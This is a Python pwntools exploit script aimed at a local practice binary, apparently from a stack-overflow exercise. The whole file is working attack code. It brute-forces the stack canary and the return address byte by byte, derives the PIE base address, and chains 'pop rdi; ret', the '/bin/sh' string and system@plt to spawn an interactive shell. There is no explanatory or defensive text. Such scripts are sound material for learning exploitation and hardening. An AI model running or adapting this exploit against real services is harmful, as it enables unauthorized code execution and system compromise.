#!/usr/bin/env python3

from pwn import *

def find_next_byte(payload):
    for i in range(256):
        next_byte = bytes([i])
        test_payload = payload + next_byte
        p.send(test_payload)
        output = p.recvuntil(b"Enter a password")
        #print(output)
        if "Authentication" in output.decode():
            print(f"[+] Found right byte {hex(i)}")
            return next_byte
    print("[-] Failed to find right byte")
    exit()

process_name = "./build/stack_overflow_bypass_pie"
p = process(process_name)

#out = p.readline()
#canary = unhex(out.strip().decode('utf-8'))
#out = p.readline()
#addr = unhex(out.strip().decode('utf-8'))

p.clean()

offset = 'A' * 24
payload_to_canary = offset.encode()

canary = b''
print(f"[+] Start bruteforcing canary...")
for i in range(8):
    canary = canary + find_next_byte(payload_to_canary + canary)
print(f"Found canary value: {canary.hex()}")

payload_with_canary = payload_to_canary + canary
payload_with_canary += b'\x42' * 8

addr = b''
print(f"[+] Start bruteforcing return address...")
for i in range(8):
    addr = addr + find_next_byte(payload_with_canary + addr)
addr = u64(addr.ljust(8, b"\x00"))
print(f"Found return address value: {hex(addr)}")

elf = ELF(process_name)
rop = ROP(elf)

init = elf.symbols['_init']
print(f'Init offset: {hex(init)}')

addr = addr - (addr & 0xfff) - init
elf.address = addr
print(f'Base address: {hex(addr)}')

bin_sh = next(elf.search(b"/bin/sh"))
print(f'Bin sh: {hex(bin_sh)}')

pop_rdi_ret = (rop.find_gadget(['pop rdi', 'ret']))[0] + elf.address
print(f'Pop rdi: {hex(pop_rdi_ret)}')

ret = (rop.find_gadget(['ret']))[0] + elf.address
print(f'Ret: {hex(ret)}')

system_plt = elf.plt['system']
print(f'System plt: {hex(system_plt)}')

payload_with_canary += p64(pop_rdi_ret)
payload_with_canary += p64(bin_sh)
payload_with_canary += p64(ret)
payload_with_canary += p64(system_plt)

p.clean()
p.send(payload_with_canary)

p.clean()
p.interactive()
